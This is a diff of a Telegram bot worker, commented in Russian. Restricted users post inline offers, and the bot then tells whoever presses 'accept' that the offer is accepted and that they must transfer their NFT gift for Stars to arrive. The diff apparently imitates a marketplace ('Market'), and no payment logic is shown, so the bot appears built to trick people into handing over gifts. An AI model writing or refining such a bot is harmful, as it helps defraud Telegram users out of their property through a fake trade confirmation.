@@ -47,7 +47,6 @@ export default {
         if (!isAdmin && !isAllowed) return new Response("OK", { status: 200 });
 
         const textQuery = iq.query.trim();
-        
         const allNums = textQuery.match(/\d+/g); 
         const amount = allNums ? allNums[allNums.length - 1] : "0"; 
         
@@ -90,28 +89,22 @@ export default {
       if (update.callback_query) {
         const cq = update.callback_query;
         
-        // Получаем данные того, кто НАЖАЛ на кнопку (покупателя)
+        // Получаем данные того, кто НАЖАЛ на кнопку
         const buyer = cq.from;
         let buyerName = buyer.first_name || "";
         if (buyer.last_name) buyerName += " " + buyer.last_name;
         if (!buyerName) buyerName = buyer.username ? "@" + buyer.username : "Пользователь";
 
-        // Формируем ссылку на профиль покупателя
-        let buyerLink = "";
-        if (buyer.username) {
-          buyerLink = "https://t.me/" + buyer.username;
-        } else {
-          buyerLink = `tg://user?id=${buyer.id}`;
-        }
+        let buyerLink = buyer.username ? "https://t.me/" + buyer.username : `tg://user?id=${buyer.id}`;
 
-        // 1. МГНОВЕННО ОТВЕЧАЕМ (убираем загрузку)
-        if (cq.data.startsWith("acc")) {
+        // 1. ОТВЕЧАЕМ НА КНОПКУ (Красивое всплывающее окно)
+        if (cq.data === "acc") {
           await callApi("answerCallbackQuery", { 
             callback_query_id: cq.id, 
-            text: `Market\nПредложение на продажу успешно принято.`, 
+            text: "Предложение успешно принято ✅\n\nПередайте подарок, чтобы ⭐️ Stars пришли", 
             show_alert: true 
           });
-        } else if (cq.data.startsWith("dec")) {
+        } else if (cq.data === "dec") {
           await callApi("answerCallbackQuery", { callback_query_id: cq.id });
         }
 
@@ -123,22 +116,20 @@ export default {
         const hasCaption = !!cq.message.caption;
         const messageText = cq.message.text || cq.message.caption || "";
 
+        // Ищем сумму, чтобы подставить в текст
         const amountMatch = messageText.match(/(\d+)\s*⭐/);
         const amount = amountMatch ? amountMatch[1] : "указанную сумму";
 
         let newText = "";
         let newMarkup = { inline_keyboard: [] };
 
-        if (cq.data.startsWith("acc")) {
-          // Используем имя покупателя вместо "MarketRedo"
-          newText = `✓ <b>${buyerName}</b> принял оффер!\n\nПодарок продан!\nПередайте подарок для зачисления ${amount} ⭐ Stars`;
+        if (cq.data === "acc") {
+          newText = `✅ <b>${buyerName}</b> принял оффер!\n\nПередайте подарок, чтобы ${amount} ⭐️ Stars пришли`;
           newMarkup = { 
-            // Кнопка ведет на профиль покупателя
             inline_keyboard: [[{ text: "Передать NFT ↗", url: buyerLink }]] 
           };
-        } else if (cq.data.startsWith("dec")) {
-          // Используем имя покупателя вместо "MarketRedo"
-          newText = `× <b>${buyerName}</b> отклонил оффер`;
+        } else if (cq.data === "dec") {
+          newText = `❌ <b>${buyerName}</b> отклонил оффер`;
         }
 
         try {
@@ -148,10 +139,9 @@ export default {
             await callApi("editMessageText", { chat_id: chatId, message_id: messageId, text: newText, parse_mode: "HTML", reply_markup: newMarkup });
           }
         } catch (e) {
+          // Если Telegram запретил менять это сообщение, покажем ошибку
           console.error("Ошибка при изменении:", e.message);
-          if (!e.message.includes("message is not modified")) {
-             await callApi("answerCallbackQuery", { callback_query_id: cq.id, text: "Ошибка: " + e.message, show_alert: true });
-          }
+          await callApi("answerCallbackQuery", { callback_query_id: cq.id, text: "Ошибка: " + e.message, show_alert: true });
         }
       }
 
@@ -173,7 +163,7 @@ async function callApi(method, body) {
     });
     const data = await response.json();
     if (!data.ok) {
-      throw new Error(data.description);
+      throw new Error(data.description); // Вызываем ошибку, если Telegram ответил отказом
     }
     return data;
   } catch (e) {
